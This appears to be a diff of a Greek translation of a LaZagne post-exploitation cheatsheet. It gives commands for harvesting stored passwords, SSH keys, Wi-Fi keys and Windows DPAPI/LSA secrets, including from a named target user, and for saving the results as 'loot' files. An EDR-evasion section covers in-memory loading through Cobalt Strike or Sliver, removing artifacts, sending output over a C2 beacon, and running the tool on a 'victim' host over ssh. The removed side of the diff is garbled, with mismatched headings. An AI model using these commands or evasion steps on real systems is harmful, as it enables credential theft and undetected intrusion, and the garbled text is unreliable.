@@ -1,42 +1,45 @@
-# 🔍 LaZagne — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[LaZagne](https://github.com/AlessandroZ/LaZagne) is an open-source post-exploitation application used to retrieve passwords stored on a local computer. It supports Windows, Linux, and macOS across multiple categories including web browsers, email clients, Wi-Fi networks, database management software, sysadmin tools, and memory caches.
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## 📋 Πίνακας περιεχομένων
 
-- [[Targeted Category Attacks](#targeted-category-attacks)](#supported-modules--categories)
-- [Εγκατάσταση](#installation--binaries)
-- [Εγκατάσταση](#linux-credential-harvesting)
+# LaZagne Cheatsheet
+
+Το [LaZagne](https://github.com/AlessandroZ/LaZagne) είναι μια εφαρμογή μετά την εκμετάλλευση ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση κωδικών πρόσβασης που είναι αποθηκευμένοι σε έναν τοπικό υπολογιστή. Υποστηρίζει Windows, Linux και macOS σε πολλές κατηγορίες, όπως προγράμματα περιήγησης ιστού, προγράμματα-πελάτες email, δίκτυα Wi-Fi, λογισμικό διαχείρισης βάσεων δεδομένων, εργαλεία sysadmin και κρυφές μνήμες μνήμης.
+
+---
+
+## Πίνακας περιεχομένων
+
+- [Υποστηριζόμενες ενότητες και κατηγορίες](#supported-modules--categories)
+- [Installation & Binaries](#installation--binaries)
+- [Linux Credential Harvesting](#linux-credential-harvesting)
 - [Windows Credential Harvesting](#windows-credential-harvesting)
 - [Targeted Category Attacks](#targeted-category-attacks)
-- [Output Formats & File Export](#output-formats--file-export)
-- [Export to Plain Text](#operational-security--edr-avoidance)
+- [Μορφές εξόδου και εξαγωγή αρχείων](#output-formats--file-export)
+- [Λειτουργική Ασφάλεια & Αποφυγή EDR](#operational-security--edr-avoidance)
 
 ---
 
-## [Targeted Category Attacks](#targeted-category-attacks)
+## Υποστηριζόμενες Ενότητες & Κατηγορίες
 
-[Operational Security & EDR Avoidance](#operational-security--edr-avoidance)
-- **Browsers**: Chrome, Firefox, Edge, Opera, Brave, Chromium (history, autofill, cookies, credentials).
-- **Sysadmin Tools**: WinSCP, PuTTY, OpenSSH (`id_rsa` keys / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
-- **Databases**: DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
-- **Wi-Fi**: Stored WPA2/WPA3 pre-shared keys (PSK) in OS network profiles.
-- **Developer & VCS**: Git credentials (`.git-credentials`, cache), SVN, Docker tokens, AWS CLI credentials.
-- **Email & Chat**: Thunderbird, Outlook, Pidgin, Skype.
-- **Windows Vault & DPAPI**: LSA secrets, DPAPI master keys, Credential Manager vault items.
+Το LaZagne εξάγει διαπιστευτήρια από δεκάδες εφαρμογές ομαδοποιημένες σε κατηγορίες:
+- **Προγράμματα περιήγησης:** Chrome, Firefox, Edge, Opera, Brave, Chromium (ιστορικό, αυτόματη συμπλήρωση, cookies, διαπιστευτήρια).
+- **Εργαλεία Sysadmin:** WinSCP, PuTTY, OpenSSH (πλήκτρα `id_rsa` / config), RDP / mstsc, FileZilla, Cyberduck, VNC.
+- **Βάσεις δεδομένων:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
+- **Wi-Fi:** Αποθηκευμένα κλειδιά WPA2/WPA3 (PSK) σε προφίλ δικτύου λειτουργικού συστήματος.
+- **Προγραμματιστής & VCS:** Διαπιστευτήρια Git (`.git-credentials`, προσωρινή μνήμη), SVN, διακριτικά Docker, διαπιστευτήρια AWS CLI.
+- **Email & Chat:** Thunderbird, Outlook, Pidgin, Skype.
+- **Windows Vault & DPAPI:** μυστικά LSA, κύρια κλειδιά DPAPI, στοιχεία θησαυροφυλάκιο του Credential Manager.
 
 ---
 
-## Εγκατάσταση
-
+## Εγκατάσταση & Binaries
 ```bash
 # Clone the repository
 git clone https://github.com/AlessandroZ/LaZagne.git
@@ -49,56 +52,49 @@ pip install -r requirements.txt
 # Windows: lazagne.exe
 # Linux: laZagne.py
 ```
-
 ---
 
-## Εγκατάσταση
+## Συγκομιδή διαπιστευτηρίων Linux
 
-### 1. Run All Extraction Modules
+### 1. Εκτελέστε όλες τις μονάδες εξαγωγής
 ```bash
 python3 laZagne.py all
 ```
-
-### 2. Run with Root / Sudo Privileges (Expands Shadow & Keyring Access)
-Linux Credential Harvesting
+### 2. Εκτέλεση με δικαιώματα Root / Sudo (Επεκτείνει την πρόσβαση σε σκιά και μπρελόκ)
+Η εκτέλεση ως `root` ξεκλειδώνει μυστικά συστήματος, προφίλ Wi-Fi στο `/etc/NetworkManager` και κλειδιά SSH σε όλους τους καταλόγους `/home/*`:
 ```bash
 sudo python3 laZagne.py all
 ```
-
-### 3. Extract Passwords from Gnome Keyring / KWallet
+### 3. Εξαγωγή κωδικών πρόσβασης από το Gnome Keyring / KWallet
 ```bash
 python3 laZagne.py sysadmin -k
 ```
-
 ---
 
-## Windows Credential Harvesting
+## Συγκομιδή διαπιστευτηρίων των Windows
 
-On Windows, use the standalone executable `lazagne.exe`:
+Στα Windows, χρησιμοποιήστε το αυτόνομο εκτελέσιμο `lazagne.exe`:
 
-### 1. Extract All Stored Passwords
+### 1. Εξαγωγή όλων των αποθηκευμένων κωδικών πρόσβασης
 ```cmd
 lazagne.exe all
 ```
-
-### 2. Run with Elevated Privileges (Admin / SYSTEM)
-On Windows, use the standalone executable `lazagne.exe`:
+### 2. Εκτέλεση με αυξημένα δικαιώματα (Διαχειριστής / ΣΥΣΤΗΜΑ)
+Εξαγωγή βασικών κλειδιών DPAPI, μυστικών LSA και αποθηκευμένων διαπιστευτηρίων τομέα:
 ```cmd
 lazagne.exe all -v
 ```
-
-### 3. Extract Passwords for a Specific User (When Running as Admin)
+### 3. Εξαγωγή κωδικών πρόσβασης για συγκεκριμένο χρήστη (όταν εκτελείται ως διαχειριστής)
 ```cmd
 lazagne.exe all -path "C:\Users\TargetUser\AppData"
 ```
-
 ---
 
-## Targeted Category Attacks
+## Επιθέσεις στοχευμένων κατηγοριών
 
-Instead of running all modules, specify target software categories to minimize disk activity and noise:
+Αντί να εκτελείτε όλες τις ενότητες, καθορίστε κατηγορίες λογισμικού προορισμού για να ελαχιστοποιήσετε τη δραστηριότητα και τον θόρυβο του δίσκου:
 
-### 1. Web Browsers Only
+### 1. Μόνο προγράμματα περιήγησης Ιστού
 ```bash
 # Linux
 python3 laZagne.py browsers
@@ -106,8 +102,7 @@ python3 laZagne.py browsers
 # Windows
 lazagne.exe browsers
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 2. Κωδικοί πρόσβασης καθαρού κειμένου Wi-Fi
 ```bash
 # Linux (requires root or sudo)
 sudo python3 laZagne.py wifi
@@ -115,8 +110,7 @@ sudo python3 laZagne.py wifi
 # Windows
 lazagne.exe wifi
 ```
-
-### 1. Web Browsers Only
+### 3. Sysadmin & Εργαλεία απομακρυσμένης πρόσβασης (SSH, RDP, WinSCP, FileZilla)
 ```bash
 # Linux
 python3 laZagne.py sysadmin
@@ -124,8 +118,7 @@ python3 laZagne.py sysadmin
 # Windows
 lazagne.exe sysadmin
 ```
-
-### 2. Wi-Fi Cleartext Passwords
+### 4. Πελάτες βάσης δεδομένων
 ```bash
 # Linux
 python3 laZagne.py databases
@@ -133,40 +126,38 @@ python3 laZagne.py databases
 # Windows
 lazagne.exe databases
 ```
-
-### 3. Sysadmin & Remote Access Tools (SSH, RDP, WinSCP, FileZilla)
+### 5. Διαπιστευτήρια προγραμματιστή και Git
 ```bash
 # Linux
 python3 laZagne.py git
 ```
-
 ---
 
-## Output Formats & File Export
+## Μορφές εξόδου & Εξαγωγή αρχείων
 
-Save harvested credentials directly to disk in structured formats:
+Αποθηκεύστε τα διαπιστευτήρια που έχουν συλλεχθεί απευθείας στο δίσκο σε δομημένες μορφές:
 
-### Export to JSON Format
+### Εξαγωγή σε μορφή JSON
 ```bash
 python3 laZagne.py all -oJ -oN /tmp/loot_credentials
 ```
-Output Formats & File Export
+Δημιουργεί το `/tmp/loot_credentials.json` που περιέχει δομημένα διαπιστευτήρια, διευθύνσεις URL, ονόματα χρήστη και κωδικούς πρόσβασης απλού κειμένου.
 
-### Save harvested credentials directly to disk in structured formats:
+### Εξαγωγή σε απλό κείμενο
 ```bash
 python3 laZagne.py all -oT -oN /tmp/loot_credentials
 ```
-Export to JSON Format
+Δημιουργεί το `/tmp/loot_credentials.txt`.
 
 ---
 
-## Export to Plain Text
+## Λειτουργική Ασφάλεια & Αποφυγή EDR
 
-- **Antivirus Detection**: Standalone `lazagne.exe` is heavily signatured by Windows Defender and commercial EDR solutions.
-- **Obfuscation & In-Memory Execution**: 
-  - Execute via PowerShell reflection or in-memory loaders (`donut`, `execute-assembly` in Cobalt Strike / Sliver).
-  - Use Python source version with a custom virtual environment rather than the packed PyInstaller binary.
-- **Clean Artifacts**: Delete temporary loot files or redirect output directly through standard out over an encrypted C2 beacon or SSH session:
+- **Ανίχνευση ιών:** Το αυτόνομο `lazagne.exe` έχει υπογραφεί σε μεγάλο βαθμό από το Windows Defender και τις εμπορικές λύσεις EDR.
+- **Συμπύκνωση και εκτέλεση στη μνήμη:**
+  - Εκτέλεση μέσω ανακλαστήρα PowerShell ή φορτωτών στη μνήμη (`donut`, `execute-assembly` σε Cobalt Strike / Sliver).
+  - Χρησιμοποιήστε την έκδοση πηγής Python με προσαρμοσμένο εικονικό περιβάλλον αντί για το γεμάτο δυαδικό PyInstaller.
+- **Clean Artifacts:** Διαγράψτε προσωρινά αρχεία loot ή ανακατευθύνετε την έξοδο απευθείας μέσω τυπικής εξόδου μέσω κρυπτογραφημένου φάρου C2 ή περιόδου λειτουργίας SSH:
   ```bash
   ssh victim@192.168.1.50 'python3 -' < laZagne.py all
   ```
